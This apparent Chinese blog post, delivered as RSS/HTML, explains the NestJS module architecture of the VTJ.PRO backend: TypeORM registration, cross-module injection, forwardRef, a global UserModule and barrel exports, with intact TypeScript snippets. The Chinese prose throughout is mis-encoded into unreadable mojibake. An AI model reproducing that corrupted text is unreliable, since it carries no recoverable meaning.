<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f58f7a7e034041d0ac13b301d265243c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lip552A5Lik5p2h6Jmr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768527801&amp;x-signature=N0Onb%2FrKNXUKRThCuLYkVLAgNR0%3D" alt="d2086122-8b4b-418b-997e-2bbdcc66062a.png" loading="lazy"/></p>
<p>ä½äº<code>backend/src/app.module.ts</code>çš„AppModuleé…ç½®ï¼š</p>
<ul>
<li>ConfigModule: ä»<code>.env</code>æ–‡ä»¶åŠ è½½ç¯å¢ƒå˜é‡ï¼Œå…·æœ‰å±‚æ¬¡ç»“æ„ï¼ˆ<code>.env.local</code>Â â†’Â <code>.env.${NODE_ENV}</code>Â â†’Â <code>.env</code>ï¼‰</li>
<li>TypeOrmModule: ä½¿ç”¨<code>ConfigService</code>å¼‚æ­¥é…ç½®MySQLè¿æ¥ï¼Œå¯ç”¨<code>autoLoadEntities</code>å’Œ<code>utf8mb4</code>å­—ç¬¦é›†</li>
<li>ScheduleModule: å¯ç”¨cronä½œä¸šè°ƒåº¦</li>
<li>å…¨å±€å®ˆå«: æ³¨å†Œ<code>UsersGuard</code>ä»¥åœ¨æ‰€æœ‰è·¯ç”±ä¸Šå¼ºåˆ¶æ‰§è¡Œæˆæƒ</li>
</ul>
<h2 data-id="heading-6">æ ‡å‡†æ¨¡å—ç»“æ„æ¨¡å¼</h2>
<p>æ¯ä¸ªåŠŸèƒ½æ¨¡å—éµå¾ªä¸€è‡´çš„ç»“æ„ï¼ŒåŒ…å«å››ä¸ªä¸»è¦ç»„ä»¶ï¼š</p>
<h3 data-id="heading-7">æ¨¡å—ç»“æ„å›¾</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79ba37054007490ab377f97c1ceb168b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lip552A5Lik5p2h6Jmr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768527801&amp;x-signature=ZyjQg7aU36XIbuUgQTysJyzy7YM%3D" alt="ce5a40dc-23b2-4bd6-b5e0-eb2908ab0e89.png" loading="lazy"/></p>
<h3 data-id="heading-8">ç¤ºä¾‹ï¼šäº§å“æ¨¡å—</h3>
<p><code>ProductModule</code>å±•ç¤ºäº†æ­¤æ¨¡å¼ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [<span class="hljs-title class_">TypeOrmModule</span>.<span class="hljs-title function_">forFeature</span>([<span class="hljs-title class_">Product</span>]), <span class="hljs-title class_">OrderModule</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">ProductService</span>],
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">ProductController</span>],
  <span class="hljs-attr">exports</span>: [<span class="hljs-title class_">ProductService</span>]
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductModule</span> {}
</code></pre>
<p><strong>ç»„ä»¶ï¼š</strong></p>
<ul>
<li>å®ä½“:Â <code>Product</code>Â - TypeORMå®ä½“å®šä¹‰æ•°æ®åº“æ¨¡å¼</li>
<li>æœåŠ¡:Â <code>ProductService</code>Â - ä¸šåŠ¡é€»è¾‘å’Œä»“åº“æ“ä½œ</li>
<li>æ§åˆ¶å™¨:Â <code>ProductController</code>Â - REST APIç«¯ç‚¹</li>
<li>DTOs: ç”¨äºéªŒè¯çš„æ•°æ®ä¼ è¾“å¯¹è±¡ï¼ˆåœ¨<code>product.dto.ts</code>ä¸­ï¼‰</li>
<li>æ¨¡å—:Â <code>ProductModule</code>Â - å°è£…å¹¶å¯¼å‡ºåŠŸèƒ½</li>
</ul>
<p>æ¨¡å—çš„æ¡¶å¼å¯¼å‡ºé‡æ–°å¯¼å‡ºæ‰€æœ‰å…¬å…±æ¥å£ã€‚</p>
<h2 data-id="heading-9">TypeORMé›†æˆæ¨¡å¼</h2>
<p>æ‰€æœ‰éœ€è¦æ•°æ®åº“è®¿é—®çš„æ¨¡å—éƒ½ä½¿ç”¨<code>TypeOrmModule.forFeature()</code>æ¨¡å¼ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70f6aeb812444ed8a8098c49d46cfe53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lip552A5Lik5p2h6Jmr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768527801&amp;x-signature=BP0sbtF6fCbXRi%2BVpl9kjvqsHc4%3D" alt="89c6734a-0c30-466a-9a3e-42bf01e29a7f.png" loading="lazy"/></p>
<h3 data-id="heading-10">ç¤ºä¾‹ï¼šè®¢å•æ¨¡å—</h3>
<p><code>OrderModule</code>å±•ç¤ºäº†TypeORMé›†æˆï¼š</p>
<ul>
<li>å¯¼å…¥<code>TypeOrmModule.forFeature([OrderEntity])</code>ä»¥æ³¨å†Œå®ä½“</li>
<li>å°†<code>Repository&lt;OrderEntity&gt;</code>æ³¨å…¥åˆ°<code>OrderService</code></li>
<li>åŒæ—¶å¯¼å…¥<code>UserModule</code>ç”¨äºè·¨æ¨¡å—ä¾èµ–</li>
</ul>
<h3 data-id="heading-11">ç¤ºä¾‹ï¼šåŒ…å«å¤šä¸ªå®ä½“çš„åº”ç”¨æ¨¡å—</h3>
<p><code>LowcodeAppModule</code>å±•ç¤ºäº†ä¸€ä¸ªç®¡ç†å¤šä¸ªç›¸å…³å®ä½“çš„æ¨¡å—ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [
    <span class="hljs-title class_">TypeOrmModule</span>.<span class="hljs-title function_">forFeature</span>([<span class="hljs-title class_">AppEntity</span>, <span class="hljs-title class_">AppVersionEntity</span>]),
    <span class="hljs-title class_">DSLModule</span>
  ],
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">AppController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">AppService</span>],
  <span class="hljs-attr">exports</span>: [<span class="hljs-title class_">AppService</span>]
})
</code></pre>
<p>è¿™æ³¨å†Œäº†<code>AppEntity</code>å’Œ<code>AppVersionEntity</code>ï¼Œå…è®¸<code>AppService</code>ä¸ºä¸¤ä¸ªå®ä½“æ³¨å…¥ä»“åº“ã€‚</p>
<h2 data-id="heading-12">æ¨¡å—ä¾èµ–æ¨¡å¼</h2>
<h3 data-id="heading-13">ç›´æ¥æ¨¡å—ä¾èµ–</h3>
<p>æ¨¡å—é€šè¿‡importsæ•°ç»„å£°æ˜ä¾èµ–ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2798dd9ff20b4260bf4a686880a93a30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lip552A5Lik5p2h6Jmr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768527801&amp;x-signature=i20EmHsf%2FjJ7rwPubwapV6910W4%3D" alt="78f0edf1-fc76-497b-abed-e086429ba3fc.png" loading="lazy"/></p>
<h3 data-id="heading-14">è·¨æ¨¡å—æœåŠ¡æ³¨å…¥</h3>
<p>å½“ä¸€ä¸ªæ¨¡å—å¯¼å‡ºä¸€ä¸ªæœåŠ¡æ—¶ï¼Œå…¶ä»–æ¨¡å—å¯ä»¥æ³¨å…¥å®ƒï¼š</p>








































<table><thead><tr><th>å¯¼å‡ºæ¨¡å—</th><th>å¯¼å‡ºçš„æœåŠ¡</th><th>æ¶ˆè´¹æ¨¡å—</th></tr></thead><tbody><tr><td><code>UserModule</code></td><td><code>UserService</code></td><td><code>OrderModule</code>,Â <code>RoleModule</code></td></tr><tr><td><code>RoleModule</code></td><td><code>RoleService</code></td><td><code>UserModule</code>,Â <code>PermissionModule</code></td></tr><tr><td><code>PermissionModule</code></td><td><code>PermissionService</code></td><td><code>RoleModule</code></td></tr><tr><td><code>DSLModule</code></td><td><code>DSLService</code></td><td><code>LowcodeAppModule</code>,Â <code>DailyModule</code></td></tr><tr><td><code>TemplateModule</code></td><td><code>TemplateService</code></td><td><code>DailyModule</code></td></tr><tr><td><code>ReportModule</code></td><td><code>ReportService</code></td><td><code>DailyModule</code></td></tr></tbody></table>
<h3 data-id="heading-15">å¾ªç¯ä¾èµ–è§£å†³</h3>
<p>å½“ä¸¤ä¸ªæ¨¡å—éœ€è¦å½¼æ­¤çš„æœåŠ¡æ—¶ï¼ŒNestJSæä¾›<code>forwardRef()</code>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af4bb5c0d6f744ab81f5b77a7256cc71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lip552A5Lik5p2h6Jmr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768527801&amp;x-signature=vCy8pYPk8F3xTSOnsDeoyrOGIm8%3D" alt="12f35004-c6f4-4e6a-92f3-2894adb3f347.png" loading="lazy"/></p>
<p>æ¥è‡ª<code>backend/src/core/user/user.module.ts</code>çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-attr">imports</span>: [
  <span class="hljs-title class_">TypeOrmModule</span>.<span class="hljs-title function_">forFeature</span>([<span class="hljs-title class_">UserEntity</span>, <span class="hljs-title class_">UserOAuthEntity</span>]),
  <span class="hljs-title class_">SettingModule</span>,
  <span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">RoleModule</span>), <span class="hljs-comment">// å¾ªç¯ä¾èµ–è§£å†³</span>
  <span class="hljs-title class_">EmailVerificationModule</span>
];
</code></pre>
<p>æ¥è‡ª<code>backend/src/core/role/role.module.ts</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-attr">imports</span>: [
  <span class="hljs-title class_">TypeOrmModule</span>.<span class="hljs-title function_">forFeature</span>([<span class="hljs-title class_">RoleEntity</span>, <span class="hljs-title class_">PermissionEntity</span>]),
  <span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">PermissionModule</span>) <span class="hljs-comment">// å¾ªç¯ä¾èµ–è§£å†³</span>
];
</code></pre>
<h2 data-id="heading-16">å…¨å±€æ¨¡å—</h2>
<p><code>@Global()</code>è£…é¥°å™¨ä½¿æ¨¡å—çš„å¯¼å‡ºåœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­å¯ç”¨ï¼Œæ— éœ€æ˜¾å¼å¯¼å…¥ï¼š</p>
<h3 data-id="heading-17">UserModuleä½œä¸ºå…¨å±€æ¨¡å—</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Global</span>()
<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [
    <span class="hljs-title class_">TypeOrmModule</span>.<span class="hljs-title function_">forFeature</span>([<span class="hljs-title class_">UserEntity</span>, <span class="hljs-title class_">UserOAuthEntity</span>]),
    <span class="hljs-title class_">SettingModule</span>,
    <span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">RoleModule</span>),
    <span class="hljs-title class_">EmailVerificationModule</span>
  ],
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">UserController</span>, <span class="hljs-title class_">OAuthController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">UserService</span>, <span class="hljs-title class_">OAuthService</span>, <span class="hljs-title class_">OAuthConfigService</span>, <span class="hljs-title class_">SettingService</span>],
  <span class="hljs-attr">exports</span>: [<span class="hljs-title class_">UserService</span>, <span class="hljs-title class_">OAuthService</span>]
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserModule</span> {}
</code></pre>
<p><code>UserModule</code>è¢«æ ‡è®°ä¸º<code>@Global()</code>ï¼Œä½¿<code>UserService</code>å’Œ<code>OAuthService</code>å¯¹æ‰€æœ‰æ¨¡å—å¯ç”¨ï¼Œæ— éœ€å¯¼å…¥<code>UserModule</code>ã€‚</p>
<p>ç†ç”±ï¼šç”¨æˆ·è®¤è¯åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­éƒ½éœ€è¦ï¼ˆå®ˆå«ã€è£…é¥°å™¨ã€ä¸šåŠ¡é€»è¾‘ï¼‰ï¼Œå› æ­¤å°†å…¶è®¾ä¸ºå…¨å±€å¯å‡å°‘æ ·æ¿å¯¼å…¥ã€‚</p>
<h2 data-id="heading-18">å¤æ‚æ¨¡å—ä¾èµ–</h2>
<h3 data-id="heading-19">Dailyæ¨¡å—ï¼šèšåˆæ¨¡å¼</h3>
<p><code>DailyModule</code>å±•ç¤ºäº†ä¸€ä¸ªå¤æ‚çš„èšåˆæ¨¡å¼ï¼Œå¯¼å…¥å¤šä¸ªä¸šåŠ¡æ¨¡å—ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5eb1cea4a1e1491ab8e446ba6db2f125~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lip552A5Lik5p2h6Jmr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768527801&amp;x-signature=riYeczBtTIgpD0iR2I%2Br6CjS1eE%3D" alt="6ed8d341-f4c5-4a14-83b1-abd278e8cba8.png" loading="lazy"/></p>
<p>å¯¼å…¥æ˜¾ç¤ºè·¨é¢†åŸŸä¾èµ–ï¼š</p>
<ul>
<li><code>AgentModule</code>ç”¨äºAIé©±åŠ¨çš„æŠ¥å‘Šç”Ÿæˆ</li>
<li><code>ReportModule</code>ç”¨äºåˆ†ææ•°æ®</li>
<li><code>TemplateModule</code>å’Œ<code>DSLModule</code>ç”¨äºä½ä»£ç ç»“æ„</li>
<li><code>LowcodeAppModule</code>ç”¨äºåº”ç”¨ç®¡ç†</li>
<li><code>OssFactoryService</code>ï¼ˆæ¥è‡ªå…¨å±€ä¸Šä¸‹æ–‡ï¼‰ç”¨äºæ–‡ä»¶å­˜å‚¨</li>
</ul>
<h2 data-id="heading-20">æ¨¡å—æ¡¶å¼å¯¼å‡º</h2>
<p>æ¯ä¸ªæ¨¡å—ç›®å½•åŒ…å«ä¸€ä¸ªindex.tsæ¡¶å¼æ–‡ä»¶ï¼Œé‡æ–°å¯¼å‡ºå…¬å…±æ¥å£ï¼š</p>
<h3 data-id="heading-21">ç¤ºä¾‹ï¼šåº”ç”¨æ¨¡å—æ¡¶å¼å¯¼å‡º</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.entity'</span>;
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./app-version.entity'</span>;
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.dto'</span>;
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.service'</span>;
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.controller'</span>;
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.module'</span>;
</code></pre>
<p>æ­¤æ¨¡å¼å…è®¸æ¶ˆè´¹è€…ä»æ¨¡å—ç›®å½•å¯¼å…¥ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppEntity</span>, <span class="hljs-title class_">AppService</span>, <span class="hljs-title class_">AppModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./business/apps'</span>;
</code></pre>
<p>è€Œä¸æ˜¯å•ä¸ªæ–‡ä»¶è·¯å¾„ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppEntity</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./business/apps/app.entity'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./business/apps/app.service'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./business/apps/app.module'</span>;
</code></pre>
<h2 data-id="heading-22">æ¨¡å—ä¾èµ–å›¾</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/916e7fbe45014c7b8a20fc34bac20467~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lip552A5Lik5p2h6Jmr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768527801&amp;x-signature=7oTYAT2zyY80uB5Xl7p%2Fl1jNCBE%3D" alt="9b02cb3d-2dbb-4f2d-9119-2d5b21682cc5.png" loading="lazy"/></p>
<p>æ­¤å›¾æ˜¾ç¤ºæ¨¡å—ä¹‹é—´çš„ä¸»è¦ä¾èµ–å…³ç³»ã€‚æ³¨æ„ï¼š</p>
<ul>
<li><code>UserModule</code>æ˜¯å…¨å±€çš„ï¼Œå› æ­¤æœªæ˜¾ç¤ºæ‰€æœ‰æ¶ˆè´¹è€…çš„ä¾èµ–</li>
<li>å¾ªç¯ä¾èµ–é€šè¿‡<code>forwardRef()</code>è§£å†³</li>
<li><code>DailyModule</code>å…·æœ‰æœ€å¤šçš„ä¾èµ–ï¼Œèšåˆè·¨é¢†åŸŸçš„æ•°æ®</li>
<li>åŸºç¡€è®¾æ–½æ¨¡å—ï¼ˆConfigã€TypeORMã€Cacheï¼‰è¢«è®¸å¤šæ¨¡å—ä½¿ç”¨ä½†æœªæ˜¾å¼å¯¼å…¥ï¼ˆç”±æ ¹é…ç½®æä¾›ï¼‰</li>
</ul>
<h2 data-id="heading-23">æ€»ç»“</h2>
<p>VTJ.PROåç«¯éµå¾ªNestJSæœ€ä½³å®è·µï¼Œå…·æœ‰ï¼š</p>
<ol>
<li>æ¸…æ™°åˆ†ç¦»ï¼šæ ¸å¿ƒåŸºç¡€è®¾æ–½æ¨¡å—ä¸ä¸šåŠ¡é¢†åŸŸæ¨¡å—</li>
<li>ä¸€è‡´ç»“æ„ï¼šå®ä½“ â†’ æœåŠ¡ â†’ æ§åˆ¶å™¨ â†’ æ¨¡å—æ¨¡å¼</li>
<li>TypeORMé›†æˆï¼šç”¨äºå®ä½“æ³¨å†Œçš„<code>forFeature()</code>æ¨¡å¼</li>
<li>ä¾èµ–æ³¨å…¥ï¼šé€šè¿‡æ„é€ å‡½æ•°æ³¨å…¥æœåŠ¡ï¼Œé€šè¿‡<code>@InjectRepository()</code>æ³¨å…¥ä»“åº“</li>
<li>å¾ªç¯ä¾èµ–ï¼šåœ¨éœ€è¦æ—¶é€šè¿‡<code>forwardRef()</code>è§£å†³</li>
<li>å…¨å±€æ¨¡å—ï¼šUserModuleæ ‡è®°ä¸º<code>@Global()</code>ä»¥å®ç°å…¨å±€è®¿é—®</li>
<li>æ¡¶å¼å¯¼å‡ºï¼š<code>index.ts</code>æ–‡ä»¶ç®€åŒ–å¯¼å…¥</li>
<li>èšåˆæ¨¡å¼ï¼šé«˜çº§æ¨¡å—ï¼ˆå¦‚DailyModuleï¼‰ç»„åˆå¤šä¸ªé¢†åŸŸæœåŠ¡</li>
</ol>
<p>è¿™ç§æ¶æ„å®ç°äº†å¯ç»´æŠ¤æ€§ã€å¯æµ‹è¯•æ€§ä»¥åŠå¹³å°å¹¿æ³›åŠŸèƒ½é›†çš„æ¸…æ™°å…³æ³¨ç‚¹åˆ†ç¦»ã€‚</p>
<blockquote>
<p>æºç å¼€æºä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fnewgateway%2Fvtj" target="_blank" title="https://gitee.com/newgateway/vtj" ref="nofollow noopener noreferrer">gitee.com/newgateway/â€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>